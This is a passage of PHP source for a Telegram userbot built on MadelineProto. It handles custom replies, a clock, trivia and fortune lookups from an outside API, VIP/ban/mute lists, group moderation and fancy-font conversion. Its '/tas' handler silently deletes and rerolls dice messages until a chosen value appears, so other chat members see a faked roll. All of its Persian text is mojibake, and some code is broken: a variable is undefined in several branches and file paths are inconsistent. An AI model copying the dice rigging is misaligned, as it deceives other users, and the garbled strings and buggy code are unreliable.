else if(preg_match("/^[\/\#\!]?(Ù¾Ø§Ø³Ø® Ø¯Ø± Ø¬ÙØ§Ø¨ Ø±Ø¨Ø§Øª) (.*)$/i", $text)){
preg_match("/^[\/\#\!]?(Ù¾Ø§Ø³Ø® Ø¯Ø± Ø¬ÙØ§Ø¨ Ø±Ø¨Ø§Øª) (.*)$/i", $text, $m);
$query = $m[2];
$text2 = str_replace(' ',' ',$query);
$data['botan'] = $text2;
file_put_contents("data.json", json_encode($data));
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
<b>[âª]--â</b> <code>ÙØªÙ Ø´ÙØ§ Ø¯Ø± Ø¬ÙØ§Ø¨ Ø±Ø¨Ø§Øª Ø¨Ù</code> :
$text2

ØªÙØ¬Ù Ø´ÙØ§ ÙØ± ÙÙÙØ¹Ù Ú©Ù Ø®ÙØ§Ø³ØªÛØ¯ ÙÛØªÙØ§ÙÛØ¯ Ø¬ÙØ§Ø¨ Ø±Ø¨Ø§Øª Ø±Ù ØªØºÛÛØ± Ø¨Ø¯ÛØ¯", 'parse_mode' => 'html' ]); 
} 



  if($text == 'Ø±Ø¨Ø§Øª'){
$botanswer = $data['botan'];
yield $MadelineProto->messages->sendMessage(['peer' => $peer,'reply_to_msg_id'=> $msg_id,'message' =>"$botanswer",'parse_mode' => 'html']);
 
 
 
}

//==================================================================================//
if(preg_match("/^\/[Tt][Aa][Ss]\s(\d)/", $text, $rr)) {
@touch("tas.txt");
@file_put_contents("tas.txt", $rr[1]);
$diceo = ['_' => 'inputMediaDice', 'emoticon' => 'ð²'];
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ê±á´É´á´ÉªÉ´É¢ á´Éªá´á´ â $rr[1] â É´á´á´¡ :-)", 'parse_mode' => 'markdown' ]);
yield $this->messages->sendMedia(['peer'=>$peer,'media'=>$diceo,'message'=>"ð²"]);}
if(isset($update['message']['media']['_'])){
if($update['message']['media']['_'] == "messageMediaDice"){
if(is_numeric(file_get_contents("tas.txt"))){
$valueo = $update['message']['media']['value'];
if(file_exists("tas.txt") and $valueo != file_get_contents("tas.txt")){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$msg_id]]);
$diceo = ['_' => 'inputMediaDice', 'emoticon' => 'ð²'];
yield $this->messages->sendMedia(['peer'=>$peer,'media'=>$diceo,'message'=>"ð²"]);
} else {
unlink("tas.txt");}}}}
	if ($text == '/time' or $text=='Ø³Ø§Ø¹Øª' or $text=='ØªØ§ÛÙ' or $text=='time') {
	    date_default_timezone_set('Asia/Tehran');
	yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'Ø­Ø§Ø¬Û Ø³Ø§Ø¹Øª Ø§ÙØ§Ù â²']);
	for ($i=1; $i <= 10; $i++){
	yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id +1, 'message' => date('H:i:s')]);
	yield $MadelineProto->sleep(1);
	}
  }
if ($text == 'Ø¯Ø§ÙØ³ØªÙÛ' or $text=='Ø§Ø·ÙØ§Ø¹Ø§Øª'  or $text=='Ø¯Ø§ÙØ³ØªÛ Ø¨Ú¯Ù') {
yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ê±á´É´á´ÉªÉ´É¢ â ð¸ðððððððððð â É´á´á´¡ :-)", 'parse_mode' => 'markdown' ]);
yield $MadelineProto->messages->sendMedia([
  'peer'  => $update,
    'media' => [
        '_' => 'inputMediaUploadedPhoto',
        'file' => 'http://api.codebazan.ir/danestani/pic/'
    ],
    'message' => 'Ø¨Ø®ÙÙ Ø´Ø§ÛØ¯ ÚÛØ²Û ÛØ§Ø¯ Ú¯Ø±ÙØªÛ ðð',
    'parse_mode' => 'HTML'
]);
}
if ($text == 'viplist' or $text=='listvip'  or $text=='ÙÛØ³Øª ÙÛÚÙ') {
     yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ê±á´É´á´ÉªÉ´É¢ â ðð¸ð¿ð»ð¸ðð â É´á´á´¡ :-)", 'parse_mode' => 'markdown' ]);
     yield $MadelineProto->messages->sendMedia([
          'peer' => $peer,
          'media' => [
              '_' => 'inputMediaUploadedDocument',
              'file' => 'list/vip.txt',
              'attributes' => [
                  ['_' => 'documentAttributeVideo', 'round_message' => false, 'supports_streaming' => true]
              ]
          ],
          'message' => 'ÙÛØ³Øª ÙÛÚÙ ÙØ§ ð',
          'parse_mode' => 'HTML'
      ]); 
}
if ($text == 'banlist' or $text=='listban'  or $text=='ÙÛØ³Øª Ø¨Ù') {
     yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ê±á´É´á´ÉªÉ´É¢ â ð±ð°ð½ð»ð¸ðð â É´á´á´¡ :-)", 'parse_mode' => 'markdown' ]);
     yield $MadelineProto->messages->sendMedia([
          'peer' => $peer,
          'media' => [
              '_' => 'inputMediaUploadedDocument',
              'file' => 'list/ban.txt',
              'attributes' => [
                  ['_' => 'documentAttributeVideo', 'round_message' => false, 'supports_streaming' => true]
              ]
          ],
          'message' => "ÙÛØ³Øª Ø¨Ù Ø´Ø¯Ù ÙØ§ ð¬",
          'parse_mode' => 'HTML'
      ]); 
}
if ($text == 'mutelist' or $text=='listmute'  or $text=='ÙÛØ³Øª Ø³Ú©ÙØª') {
  yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ê±á´É´á´ÉªÉ´É¢ â ð¼ððð´ð»ð¸ðð â É´á´á´¡ :-)", 'parse_mode' => 'markdown' ]);
     yield $MadelineProto->messages->sendMedia([
          'peer' => $peer,
          'media' => [
              '_' => 'inputMediaUploadedDocument',
              'file' => 'list/mute.txt',
              'attributes' => [
                  ['_' => 'documentAttributeVideo', 'round_message' => false, 'supports_streaming' => true]
              ]
          ],
          'message' => 'ÙÛØ³Øª Ø³Ú©ÙØª Ø´Ø¯Ù ÙØ§ ð',
          'parse_mode' => 'HTML'
      ]); 
}
if ($text == 'ÙØ§Ù' or $text=='ÙØ§Ù Ø¨ÙÙÙØ§'  or $text=='ÙØ§Ù Ø¨Ú¯ÛØ±') {
     yield $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "ê±á´É´á´ÉªÉ´É¢ â ð¾ððð  â É´á´á´¡ :-)", 'parse_mode' => 'markdown' ]);
     $link = json_decode(file_get_contents("https://api.codebazan.ir/fal/?type=json"),true);
     $reza = $link['Result'];
     $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' =>"
     Ø§ÛÙÙ Ø§Ø² ÙØ§Ù Ø²ÙØ¯Ú¯Û Ø´Ø®ÙÛØª Ø¨ÙÙÙØ§ ð¥´
     ââââââââââââââââââââââââ
$reza
     ââââââââââââââââââââââââ
     "]);
}

          else if(preg_match("/^[\/\#\!]?(setvip) (.*)$/i", $text)){
               preg_match("/^[\/\#\!]?(setvip) (.*)$/i", $text, $m);
               $query = $m[2];
               $time = date("H:i:s");
               if($type3 == 'supergroup' or $type3 == 'chat'){
                 $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                 $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                 $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                 $messag = $gms['messages'][0]['from_id'];
                    $mes = "\n Ú©Ø§Ø±Ø¨Ø± $messag  \n Ø¯ÙÛÙ :$query\nâ¾âââââââââââââ¾\n";
                    file_put_contents('list/vip.txt', $mes,FILE_APPEND);
                    $vip = ['_' => 'chatBannedRights', 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => false, 'embed_links' => false, 'send_polls' => false, 'change_info' => true, 'invite_users' => false, 'pin_messages' => false, 'until_date' => 999999];
       $MadelineProto->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $vip, ]);
       $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
       Ú©Ø§Ø±Ø¨Ø± â¢ $messag 
       Ø¯Ø± Ø³Ø§Ø¹Øª â¢ $time 
       Ø¨Ù Ø¯ÙÛÙ â¢ $query 
       Ø¯Ø± ÙÛØ³Øª ÙÛÚÙ ÙØ§ ÙØ±Ø§Ø± Ú¯Ø±ÙØª ð
       "]);
       }
     }
     else if(preg_match("/^[\/\#\!]?(mute) (.*)$/i", $text)){
          preg_match("/^[\/\#\!]?(mute) (.*)$/i", $text, $m);
          $query = $m[2];
          if($type3 == 'supergroup' or $type3 == 'chat'){
            $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
            $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
            $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
            $messag = $gms['messages'][0]['from_id'];
            $mes = "\n Ú©Ø§Ø±Ø¨Ø± $messag \n Ø¯ÙÛÙ :$query \nâ¾âââââââââââââ¾\n";
                        file_put_contents('list/mute.txt', $mes,FILE_APPEND);
            $mute = ['_' => 'chatBannedRights', 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
            $MadelineProto->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $mute, ]);
            $MadelineProto->channels->deleteUserHistory(['channel' => $peer, 'user_id' => $messag, ]);
            $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
            Ú©Ø§Ø±Ø¨Ø± â¢ $messag 
            Ø¯Ø± Ø³Ø§Ø¹Øª â¢ $time 
            Ø¨Ù Ø¯ÙÛÙ â¢ $query 
            Ø¯Ø± ÙÛØ³Øª Ø³Ú©ÙØª ÙØ§ Ø´Ø¯Ù ÙØ±Ø§Ø± Ú¯Ø±ÙØª ð¬
            "]);
            }
          }
          else if(preg_match("/^[\/\#\!]?(ban) (.*)$/i", $text)){
               preg_match("/^[\/\#\!]?(ban) (.*)$/i", $text, $m);
               $query = $m[2];
               if($type3 == 'supergroup' or $type3 == 'chat'){
                 $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                 $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                 $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                 $messag = $gms['messages'][0]['from_id'];
                 $mee = yield $MadelineProto->get_full_info($messag);
                 $mes = "\n Ú©Ø§Ø±Ø¨Ø± $messag \n Ø¯ÙÛÙ :$query \nâ¾âââââââââââââ¾\n";
                 file_put_contents('list/ban.txt', $mes,FILE_APPEND);
                 $ban = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
                 $MadelineProto->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $ban, ]);
                 $MadelineProto->channels->deleteUserHistory(['channel' => $peer, 'user_id' => $messag ]);
                 $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
                 Ú©Ø§Ø±Ø¨Ø± â¢ $messag 
                 Ø¯Ø± Ø³Ø§Ø¹Øª â¢ $time 
                 Ø¨Ù Ø¯ÙÛÙ â¢ $query 
                 Ø¯Ø± ÙÛØ³Øª Ø¨Ù Ø´Ø¯Ù ÙØ§ ÙØ±Ø§Ø± Ú¯Ø±ÙØª ð
                 "]); 
                  }
               }
               else if(preg_match("/^[\/\#\!]?(unban) (.*)$/i", $text)){
                    preg_match("/^[\/\#\!]?(unban) (.*)$/i", $text, $m);
                    $query = $m[2];
                    if($type3 == 'supergroup' or $type3 == 'chat'){
                      $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                      $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                      $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                      $messag = $gms['messages'][0]['from_id'];
                      $mes = "\n Ú©Ø§Ø±Ø¨Ø± $messag \n Ø¯ÙÛÙ :$query \nâ¾âââââââââââââ¾\n";   
                       file_put_contents('list/ban.txt', $mes,FILE_APPEND);
                      $unban = ['_' => 'chatBannedRights', 'view_messages' => false, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => false, 'pin_messages' => true, 'until_date' => 99999];
                      $MadelineProto->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $unban, ]);
                      $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
                      Ú©Ø§Ø±Ø¨Ø± â¢ $messag 
                      Ø¯Ø± Ø³Ø§Ø¹Øª â¢ $time 
                      Ø¨Ù Ø¯ÙÛÙ â¢ $query 
                      Ø§Ø² ÙÛØ³Øª Ø¨Ù Ø´Ø¯Ù ÙØ§ Ø®Ø§Ø±Ø¬ Ø´Ø¯ ð
                      "]); 
                      }
                    }
                    else if(preg_match("/^[\/\#\!]?(unmute) (.*)$/i", $text)){
                         preg_match("/^[\/\#\!]?(unmute) (.*)$/i", $text, $m);
                         $query = $m[2];
                         if($type3 == 'supergroup' or $type3 == 'chat'){
                           $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                           $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                           $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                           $messag = $gms['messages'][0]['from_id'];
                           $mee = yield $MadelineProto->get_full_info($messag);
                           $mes = "\n Ú©Ø§Ø±Ø¨Ø± $messag \n Ø¯ÙÛÙ :$query \nâ¾âââââââââââââ¾\n";
                           file_put_contents('list/mute.txt', $mes,FILE_APPEND);
                           $unmute = ['_' => 'chatBannedRights',  'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => false, 'pin_messages' => true, 'until_date' => 9999];
                           $MadelineProto->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $unmute, ]);
                           $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
                           Ú©Ø§Ø±Ø¨Ø± â¢ $messag 
                           Ø¯Ø± Ø³Ø§Ø¹Øª â¢ $time 
                           Ø¨Ù Ø¯ÙÛÙ â¢ $query 
                           Ø§Ø² ÙÛØ³Øª Ø³Ú©ÙØª Ø´Ø¯Ù ÙØ§ Ø®Ø§Ø±Ø¬ Ø´Ø¯ ð¬
                      "]); 
                    }
                         }
               else if(preg_match("/^[\/\#\!]?(delvip) (.*)$/i", $text)){
                    preg_match("/^[\/\#\!]?(delvip) (.*)$/i", $text, $m);
                    $query = $m[2];
                    if($type3 == 'supergroup' or $type3 == 'chat'){
                      $gmsg = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$msg_id]]);
                      $messag1 = $gmsg['messages'][0]['reply_to_msg_id'];
                      $gms = yield $MadelineProto->channels->getMessages(['channel' => $peer, 'id' => [$messag1]]);
                      $messag = $gms['messages'][0]['from_id'];
                      $mee = yield $MadelineProto->get_full_info($messag);
                      $mes = "\n Ú©Ø§Ø±Ø¨Ø± $messag \n Ø¯ÙÛÙ :$query \nâ¾âââââââââââââ¾\n";
                      file_put_contents('list/vip.txt', $mes,FILE_APPEND);
                      $delvip = ['_' => 'chatBannedRights', 'send_messages' => false, 'send_media' => true, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
                      $MadelineProto->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $delvip, ]);
                      $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "
                      Ú©Ø§Ø±Ø¨Ø± â¢ $messag 
                      Ø¯Ø± Ø³Ø§Ø¹Øª â¢ $time 
                      Ø¨Ù Ø¯ÙÛÙ â¢ $query 
                      Ø§Ø² ÙÛØ³Øª ÙÛÚÙ ÙØ§ Ø®Ø§Ø±Ø¬ Ø´Ø¯ ð
                      "]); 
                      }
                    }
if ($text == 'Ù¾Ø§Ú©Ø³Ø§Ø²Û ÙÛØ³Øª Ø³Ú©ÙØª' or $text == 'cleanmute') {
file_put_contents("mute.txt", 'ÙÛØ³Øª Ù¾Ø§Ú©Ø³Ø§Ø²Û Ø´Ø¯');
$MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Ø³Ø±ÙØ±Ùð ÙÛØ³Øª Ø§ÙØ±Ø§Ø¯ Ø³Ú©ÙØª Ø´Ø¯Ù Ù¾Ø§Ú©Ø³Ø§Ø²Û Ø´Ø¯"]);

}
if ($text == 'Ù¾Ø§Ú©Ø³Ø§Ø²Û ÙÛØ³Øª Ø¨Ù' or $text == 'cleanban') {
     file_put_contents("ban.txt", 'ÙÛØ³Øª Ù¾Ø§Ú©Ø³Ø§Ø²Û Ø´Ø¯');
     $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Ø³Ø±ÙØ±Ùð ÙÛØ³Øª Ø§ÙØ±Ø§Ø¯ Ø¨Ù Ø´Ø¯Ù Ù¾Ø§Ú©Ø³Ø§Ø²Û Ø´Ø¯"]);

     }
     if ($text == 'Ù¾Ø§Ú©Ø³Ø§Ø²Û ÙÛØ³Øª ÙÛÚÙ' or $text == 'cleanvip') {
          file_put_contents("vip.txt", 'ÙÛØ³Øª Ù¾Ø§Ú©Ø³Ø§Ø²Û Ø´Ø¯');
          $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Ø³Ø±ÙØ±Ùð ÙÛØ³Øª Ø§ÙØ±Ø§Ø¯ ÙÛÚÙ Ù¾Ø§Ú©Ø³Ø§Ø²Û Ø´Ø¯"]);

          }
          if ($text == 'Ù¾Ø§Ú©Ø³Ø§Ø²Û ÙÛØ³Øª ÙØ§' or $text == 'cleanlist') {
               file_put_contents("mute.txt", 'ÙÛØ³Øª Ù¾Ø§Ú©Ø³Ø§Ø²Û Ø´Ø¯');
               file_put_contents("ban.txt", 'ÙÛØ³Øª Ù¾Ø§Ú©Ø³Ø§Ø²Û Ø´Ø¯');
               file_put_contents("vip.txt", 'ÙÛØ³Øª Ù¾Ø§Ú©Ø³Ø§Ø²Û Ø´Ø¯');
               $MadelineProto->messages->editMessage(['peer' => $peer,'id' => $msg_id,'message' => "Ø³Ø±ÙØ±Ùð ÙÙÙ ÙÛØ³Øª ÙØ§Û (Ø³Ú©ÙØª . Ø¨Ù . ÙÛÚÙ) Ù¾Ø§Ú©Ø³Ø§Ø²Û Ø´Ø¯ÙØ¯"]);
               }

if($data['enfont'] == 'on'){
$text = strtoupper("$text");
$en = ['Q','W','E','R','T','Y','U','I','O','P','A','S','D','F','G','H','J','K','L','Z','X','C','V','B','N','M'];
$a_a = ['ð','ð','ð´','ð','ð','ð','ð','ð¸','ð¾ï¸','ð¿ï¸','ð°ï¸','ð','ð³','ðµ','ð¶','ð·','ð¹','ðº','ð»','ð','ð','ð²','ð','ð±ï¸','ð½','ð¼'];
$b_b = ['ð ','ð¦','ð','ð¡','ð£','ð¨','ð¤','ð','ð','ð','ð','ð¢','ð','ð','ð','ð','ð','ð','ð','ð© ','ð§','ð','ð¥','ð','ð','ð'];
$c_c = ['QÌ·Ì·','WÌ·Ì·','EÌ·Ì·','RÌ·Ì·','TÌ·Ì·','YÌ·Ì·','UÌ·Ì·','IÌ·Ì·','OÌ·Ì·','PÌ·Ì·','AÌ·Ì·','SÌ·Ì·','DÌ·Ì·','FÌ·Ì·','GÌ·Ì·','HÌ·Ì·','JÌ·Ì·','KÌ·Ì·','LÌ·Ì·','ZÌ·Ì·','XÌ·Ì·','CÌ·Ì·','VÌ·Ì·','BÌ·Ì·','NÌ·Ì·','MÌ·Ì·'];
$d_d = ['â','â','âº','â','â','â','â','â¾','â','â','â¶','â','â¹','â»','â¼','â½','â¿','â','â','â','â','â¸','â','â·','â','âï¸'];
$e_e = ['Ç«','á´¡','á´','Ê','á´','Ê','á´','Éª','á´','á´','á´','s','á´','Ò','É¢','Ê','á´','á´','Ê','á´¢','x','á´','á´ ','Ê','É´','á´'];
$f_f = ['â','á','â®','â','Æ¬','á½','Æ²','á','á¾','â','á¯','á','â','â±','á©','â','â','Ó','â','â¤','âµ','â­','á','á°','â','â³'];
$h_h = ['ð','ð','ð´','ð','ð','ð','ð','ð¸','ð¾','ð¿','ð°','ð','ð³','ðµ','ð¶','ð·','ð¹','ðº','ð»','ð','ð','ð²','ð','ð±','ð½','ð¼'];
$ss = str_replace($en,$a_a,$text);
$aa = str_replace($en,$b_b,$text);
$bb = str_replace($en,$c_c,$text);
$cc = str_replace($en,$d_d,$text);
$dd = str_replace($en,$e_e,$text);
$ee = str_replace($en,$f_f,$text);
$hh = str_replace($en,$h_h,$text);
$bots = [$ss,$aa,$bb,$cc,$dd,$ee,$hh,];
$ru = $bots[rand(0, count($bots)-1)];
yield $MadelineProto->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "$ru",'parse_mode'=>'HTML']); 
}
if($data['fafont'] == 'on'){
$text = strtoupper("$text");
$fas = ['Ø¢','Ø§','Ø¨','Ù¾','Øª','Ø«','Ø¬','Ú','Ø­','Ø®','Ø¯','Ø°','Ø±','Ø²','Ú','Ø³','Ø´','Øµ','Ø¶','Ø·','Ø¸','Ø¹','Øº','Ù','Ù','Ú©','Ú¯','Ù','Ù','Ù','Ù','Ù','Û']; 
$_a_a = ['Ø¢','Ø§ÙÙ','Ø¨ÙÙ','Ù¾ÙÙÙÙÙÙ','ØªÙÙÙ','Ø«ÙÙ','Ø¬ÙÙ','ÚÙÙ','Ø­ÙÙÙÙÙ','Ø®ÙÙ','Ø¯ÙÙ','Ø°ÙÙ','Ø±ÙÙ','Ø²ÙÙ','ÚÙÙ','Ø³ÙÙÙÙÙÙ','Ø´ÙÙÙÙÙ','ØµÙÙ','Ø¶ÙÙ','Ø·ÙÙ','Ø¸ÙÙ','Ø¹ÙÙ','ØºÙÙ','ÙÙÙ','ÙÙÙ','ÚªÙÙÙÙ','Ú¯ÙÙÙÙ','ÙÙÙ','ÙÙÙÙÙÙÙ','ÙÙÙ','ÙÙÙ','ÙÙÙ','ÛÙÙ'];
$_b_b = ['Ø¢','Ø§','Ø¨ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','Ù¾ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','ØªÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','Ø«ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','Ø¬ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','ÚÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','Ø­ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙâ','Ø®ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','Ø¯ÛªÙ','Ø°ÛªÙ','Ø±ÛªÙ','Ø²ÛªÙâ','ÚÛªÙ','Ø³ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙâ','Ø´ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','ØµÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','Ø¶ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','Ø·ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙâ','Ø¸ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','Ø¹ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙâ','ØºÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','ÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','ÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙâ','Ú©ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','Ú¯ÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙâ','ÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙâ','ÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙâ','ÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','Ù','ÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ','ÛÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙÙÛªÙ']; 
$_c_c = ['Ø¢','Ø§','Ø¨ÙÙÙ','Ù¾ÙÙ','ØªÙÙÙ','Ø«ÙÙ','Ø¬ÙÙ','ÚÙÙ','Ø­ÙÙ','Ø®ÙÙ','Ø¯Ù','Ø°Ù','Ø±Ù','Ø²Ù','ÚÙ','Ø³ÙÙ','Ø´ÙÙ','ØµÙÙ','Ø¶ÙÙ','Ø·ÙÙ','Ø¸ÙÙ','Ø¹ÙÙ','ØºÙÙ','ÙÙÙ','ÙÙÙ','Ú©ÙÙ','Ú¯ÙÙ','ÙÙÙ','ÙÙÙÙ','ÙÙÙÙ','ÙÙ','ÙÙÙ','ÛÙÙÙ']; 
$_d_d = ['Ø¢','Ø§','Ø¨Ùï¹Ù','Ù¾Ùï¹Ù','ØªÙï¹Ù','Ø«Ùï¹ÙÙ','Ø¬Ùï¹ÙÙ','ÚÙï¹Ù','Ø­Ùï¹Ù','Ø®Ùï¹Ù','Ø¯','Ø°','Ø±','Ø²','Ú','Ø³Ùï¹Ù','Ø´Ùï¹Ù','ØµÙï¹ÙÙ','Ø¶Ùï¹Ù','Ø·Ùï¹Ù','Ø¸Ùï¹ÙÙ','Ø¹Ùï¹Ù','ØºÙï¹Ù','ÙÙï¹Ù','ÙÙï¹Ù','Ú©Ùï¹Ù','Ú¯Ùï¹Ù','ÙÙï¹ÙÙ','ÙÙï¹Ù','ÙÙï¹Ù','Ù','ÙÙï¹Ù','ÛÙï¹Ù']; 
$_e_e = ['Ø¢','Ø§','Ø¨ÍÙÍÙÍÙÍÙ','Ù¾ÍÙÍÙÍÙÍÙ','ØªÍÙÍÙÍÙÍÙ','Ø«ÍÙÍÙÍÙÍÙ','Ø¬ÍÙÍÙÍÙÍÙ','ÚÙÍÙÍÙÍÙ','Ø­ÍÙÍÙÍÙÍÙ','Ø®ÙÍÙÍÙÍÙ','Ø¯','Ø°','Ø±','Ø²','Ú','Ø³ÙÍÙÍÙÍÙ','Ø´ÙÍÙÍÙÍÙ','ØµÍÙÍÙÍÙÍÙ','Ø¶ÍÙÍÙÍÙÍÙ','Ø·ÍÙÍÙÍÙÍÙ','Ø¸ÙÍÙÍÙÍÙÍÙ','Ø¹ÍÙÍÙÍÙÍÙ','ØºÍÙÍÙÍÙÍÙ','ÙÙÍÙÍÙÍÙÍÙ','ÙÙÍÙÍÙÍÙ','Ú©ÙÍÙÍÙÍÙ','Ú¯ÙÍÙÍÙÍÙÍÙ','ÙÍÙÍÙÍÙÍÙ','ÙÍÙÍÙÍÙÍÙ','ÙÍÙÍÙÍÙÍÙ','Ù','ÙÍÙÍÙÍÙÍÙ','ÛÍÙÍÙÍÙÍÙ']; 
